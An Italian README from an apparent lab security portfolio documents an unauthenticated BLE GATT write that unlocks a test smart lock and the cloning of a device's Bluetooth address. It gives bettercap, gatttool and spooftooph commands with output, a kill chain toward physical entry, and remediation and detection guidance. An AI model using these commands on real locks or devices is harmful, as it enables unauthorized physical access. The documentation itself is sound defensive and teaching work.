> [English](README.en.md) | **Italiano**

# Bluetooth/BLE Spoofing - GATT Write e Device Impersonation

> - **Fase:** Wireless Security - Manipulation & Impersonation (BLE)
> - **Visibilita:** Media - la scrittura su caratteristiche GATT e una connessione client apparentemente legittima; l'impersonation di un device richiede la clonazione degli advertising packet (rilevabile confrontando i MAC attivi)
> - **Prerequisiti:** Enumerazione GATT completata con caratteristiche scrivibili identificate (vedere `../recon/`, WIFI-006); adattatore BLE; per l'impersonation: capacita di spoofing del MAC BLE
> - **Output:** WIFI-007; manipolazione dello stato di un device BLE (comando non autorizzato); impersonation di un device fidato; injection di valori su caratteristiche non protette

- **Ambiente Operativo:** Kali Linux (Attaccante), dongle BLE, dispositivi IoT di laboratorio
- **Target:** Serratura smart di test con caratteristica `Lock Control` scrivibile (da WIFI-006)
- **Tool principali:** bettercap (ble.write), gatttool, spooftooph

---

## Executive Summary

Lo spoofing BLE trasforma la scoperta del recon (caratteristiche GATT non protette, WIFI-006) in un'azione concreta sul device. Due sono i vettori principali. Il primo, la GATT write non autorizzata, scrive direttamente su una caratteristica scrivibile per manipolare lo stato del dispositivo - nel caso di test, comandare una serratura smart. Il secondo, la device impersonation, clona l'identita BLE (MAC e advertising) di un device fidato per ingannare l'app o l'ecosistema che si aspetta di comunicare con l'originale.

Il finding WIFI-007 documenta la scrittura non autorizzata sulla caratteristica `Lock Control` identificata durante l'enumerazione. E l'esempio da manuale della conseguenza di un modello di sicurezza IoT che delega tutto all'applicazione mobile: se il layer BLE accetta scritture senza autenticazione, l'app diventa irrilevante, perche l'attaccante parla direttamente all'hardware.

Questa sezione dimostra il principio piu importante della sicurezza IoT: la sicurezza deve essere applicata al layer piu basso possibile (il device stesso), non delegata a un livello superiore (l'app) che l'attaccante puo semplicemente aggirare.

---

## Struttura della cartella

```
spoofing/
+-- README.md      # questo file: GATT write non autorizzata + device impersonation (WIFI-007)
+-- img/           # screenshot della manipolazione dello stato del device
```

---

## GATT Write Non Autorizzata

**ID Finding:** `WIFI-007` | **Severity:** `Medio` (manipolazione dello stato di un device BLE non protetto; severity dipendente dalla criticita del device: `Alto`/`Critico` per serrature, dispositivi medici, controlli industriali)

### Contesto operativo

Durante l'enumerazione GATT (WIFI-006) e stata identificata la caratteristica `Lock Control (ffe1)`, handle `0x0015`, con proprieta `WRITE` e nessun requisito di autenticazione. La logica applicativa della serratura interpreta il valore `01` come comando di sblocco. Poiche il layer BLE non richiede pairing per la scrittura, un attaccante puo inviare questo comando direttamente.

### PoC - Scrittura del comando di sblocco

```Bash
# Scrittura diretta sulla caratteristica con bettercap
sudo bettercap
> ble.recon on
> ble.write 4c:65:a8:db:11:22 ffe1 01
```

```
[ble.write] writing 1 byte to characteristic ffe1 of 4c:65:a8:db:11:22
[ble.write] characteristic ffe1 written                       <-- comando accettato
```

```Bash
# Alternativa con gatttool
gatttool -b 4C:65:A8:DB:11:22 --char-write-req -a 0x0015 -n 01
```

```
Characteristic value was written successfully                 <-- serratura sbloccata (WIFI-007)
```

```Bash
# Verifica dello stato tramite la caratteristica di status
gatttool -b 4C:65:A8:DB:11:22 --char-read -a 0x0018
```

```
Characteristic value/descriptor: 01        <-- Lock Status = unlocked (comando eseguito)
```

### Remediation

- **Azione immediata:** disabilitare o proteggere le caratteristiche GATT che comandano funzioni fisiche; nessun comando sensibile deve essere eseguibile senza autenticazione a livello applicativo
- **Azione strutturale:** implementare un meccanismo challenge-response applicativo su ogni comando sensibile: il device genera un nonce, l'app lo firma con una chiave derivata dal pairing, il device verifica prima di eseguire. Questo rende inutile la scrittura diretta anche se il layer BLE e accessibile; adottare LE Secure Connections con pairing MITM-protected; applicare rate limiting e logging dei comandi lato device
- **Verifica:** tentare la scrittura diretta con bettercap/gatttool dopo l'hardening; il comando deve essere rifiutato o ignorato dalla logica applicativa

---

## Device Impersonation

### Contesto operativo

L'impersonation clona l'identita BLE di un device fidato (indirizzo e advertising) per ingannare l'ecosistema. Se l'app mobile o un hub identifica il device di fiducia solo tramite MAC address e nome (senza autenticazione crittografica), un clone puo sostituirsi all'originale e ricevere comandi o inviare dati falsificati.

```Bash
# Spoofing dell'indirizzo Bluetooth dell'adattatore attaccante
sudo spooftooph -i hci0 -a 4C:65:A8:DB:11:22
# L'adattatore ora si presenta con il MAC del device target
```

L'impersonation e efficace solo contro sistemi che si fidano dell'identita BLE senza verifica crittografica. E il corrispondente BLE dell'Evil Twin WiFi (`../../01-wifi (802.11)/rogue-ap/`): entrambi sfruttano l'assenza di autenticazione mutua forte.

---

## Esperienza di Laboratorio

La parte piu istruttiva dell'esercizio e stata la banalita dell'attacco una volta completato il recon. Identificato l'handle scrivibile durante l'enumerazione GATT, la scrittura del comando di sblocco e stata un singolo comando `ble.write`. Non c'e stato alcun bypass crittografico, nessun exploit: il device semplicemente accettava scritture da chiunque. Questo ha reso concreto un concetto astratto: la maggior parte delle vulnerabilita IoT non richiede tecniche sofisticate, ma sfrutta l'assenza totale di controlli.

Un'osservazione operativa: la difficolta e stata mappare il valore corretto da scrivere. La caratteristica accettava scritture, ma capire che `01` corrispondesse a "unlock" ha richiesto l'osservazione del traffico legittimo tra l'app e il device (con lo sniffing) e alcuni tentativi. In un attacco reale questa fase di reverse engineering del protocollo applicativo e spesso il vero collo di bottiglia, non l'accesso al layer BLE.

---

## Analisi Teorica: Perche la Sicurezza va Applicata al Layer Piu Basso

L'attacco WIFI-007 illustra il fallimento del principio di "security in depth" quando applicato male. Il produttore ha implementato la sicurezza a livello di app (autenticazione utente, PIN, biometria), ma ha lasciato il layer di trasporto (BLE GATT) completamente aperto. L'assunzione implicita - "solo la nostra app parlera con il device" - e falsa: qualsiasi client BLE puo connettersi e scrivere.

Il principio corretto e che ogni layer deve validare in modo indipendente cio che accetta, senza fidarsi dei layer superiori. Il device fisico (l'ultimo anello, quello che esegue l'azione irreversibile di sbloccare) deve essere l'ultimo a verificare l'autorizzazione, perche e il punto che l'attaccante deve necessariamente raggiungere. Delegare questa verifica all'app significa spostare il controllo in un punto che l'attaccante puo aggirare.

Questo si collega al modello di minaccia BLE: il canale radio e intrinsecamente accessibile (chiunque nel raggio puo connettersi), quindi la sicurezza non puo dipendere dall'inaccessibilita del canale ma deve basarsi su autenticazione e cifratura end-to-end tra i due endpoint legittimi. LE Secure Connections fornisce gli strumenti crittografici; sta al produttore usarli su ogni caratteristica sensibile. La lezione, valida oltre il BLE, e che la sicurezza per oscurita o per delega e sempre aggirabile.

---

## Scenario Reale: Proiezione Post-Exploitation

> Questa sezione descrive come questo finding si inserirebbe in un engagement reale, sia dal punto di vista dell'attaccante (Red Team) che del difensore (Blue Team).

### Prospettiva Attaccante (Red Team)

**Punto di partenza:** capacita di manipolare lo stato di un device BLE non protetto (WIFI-007) - nel test, una serratura smart.

**Passo successivo immediato:** in un contesto di sicurezza fisica, lo sblocco della serratura fornisce accesso fisico all'edificio, che apre l'intera catena di attacco fisico (drop di un implant di rete, accesso a postazioni non bloccate).

**Kill Chain proiettata:**

```
[WIFI-007] Controllo device BLE non protetto (smart lock)
        |
        v
Accesso fisico all'edificio / area riservata
        |
        v
Drop di un implant (Raspberry Pi, LAN turtle) sulla rete interna
        |
        v
Foothold interno persistente -> pivoting (07-post-exploitation)
```

**Impatto potenziale:** i dispositivi BLE controllano sempre piu spesso funzioni fisiche critiche (serrature, cancelli, dispositivi medici, controlli industriali). Una GATT write non autenticata su una serratura equivale a una chiave universale; su un dispositivo medico puo avere conseguenze sulla sicurezza delle persone. Il vettore collega il layer wireless alla sicurezza fisica (`../../04-rfid-nfc (Physical Access)/`) e all'accesso alla rete interna.

### Prospettiva Difensore (Blue Team)

**Rilevamento:** la maggior parte dei device BLE economici non logga le connessioni ne i comandi, rendendo l'attacco difficile da rilevare. Dispositivi maturi possono loggare connessioni GATT anomale (MAC non bonded) e comandi fuori sequenza.

**Indicatori di Compromissione (IOC):**
- Connessioni GATT da un MAC non presente nella lista dei device bonded
- Comandi di stato (unlock) non correlati a un evento dell'app legittima
- Advertising duplicato dallo stesso MAC (possibile impersonation)
- Log applicativo che mostra azioni senza la corrispondente autenticazione utente

**Contenimento:** aggiornamento firmware del device per richiedere autenticazione sulle caratteristiche sensibili; disabilitazione delle funzioni BLE se non essenziali; riduzione della potenza di trasmissione.

**Eradicazione e hardening:**
- Firmware che impone challenge-response su ogni comando sensibile
- LE Secure Connections con bonding obbligatorio
- Logging e alerting su connessioni da MAC non autorizzati
- Threat model che tratta il canale BLE come pubblico e non fidato

**Lezione difensiva:** un dispositivo che esegue azioni fisiche irreversibili deve autenticare ogni comando al proprio livello, indipendentemente da quale software si suppone lo invii. La comodita del "pairing una tantum" non deve tradursi in "fiducia permanente e incondizionata" verso chiunque parli il protocollo.

---

## Tool di riferimento

| Tool | Tipo | Tecnica/Accesso | Caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `bettercap` | MITM framework | CLI | Modulo `ble.write`: scrittura su caratteristiche GATT (riferimento moderno) |
| `gatttool` | GATT client | CLI | Scrittura/lettura diretta di handle GATT (legacy ma preciso) |
| `spooftooph` | BT address spoofer | CLI | Clonazione dell'indirizzo Bluetooth per impersonation |
| `nRF Connect` | BLE explorer | GUI / Mobile | Test interattivo di scrittura su caratteristiche |
| `btlejack` | BLE hijacker | CLI | Hijacking di connessioni BLE attive (con hardware Micro:bit) |

> **Tool moderno consigliato:** `bettercap` per le operazioni GATT e `btlejack` (Damien Cauquil) per l'hijacking di connessioni BLE gia stabilite tramite hardware BBC Micro:bit. Il [Flipper Zero](https://github.com/Nicholas-Arcari/FlipperZero-guide) con app BLE dedicate copre alcuni scenari di replay/impersonation in modo portatile.

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Impact | Manipulation of Control | `T0831` | Scrittura non autorizzata su caratteristica GATT per comandare un device fisico (WIFI-007) |
| Collection | Adversary-in-the-Middle | `T1557` | Impersonation di un device BLE fidato per intercettare o iniettare comandi |
| Defense Evasion | Impersonation | `T1656` | Clonazione dell'identita BLE (MAC/advertising) di un device legittimo |
| Initial Access | Hardware Additions | `T1200` | Utilizzo del controllo BLE per ottenere accesso fisico (sblocco serratura) |

---

> **Nota:** Tutte le attivita documentate sono state condotte su dispositivi Bluetooth/BLE di laboratorio di proprieta dell'autore. La manipolazione via GATT write e l'impersonation sono state eseguite esclusivamente contro device di test. La manipolazione non autorizzata di dispositivi di terzi costituisce reato e, nel caso di serrature o dispositivi di sicurezza, puo configurare reati gravi. Le tecniche sono documentate a scopo educativo e di security assessment autorizzato.
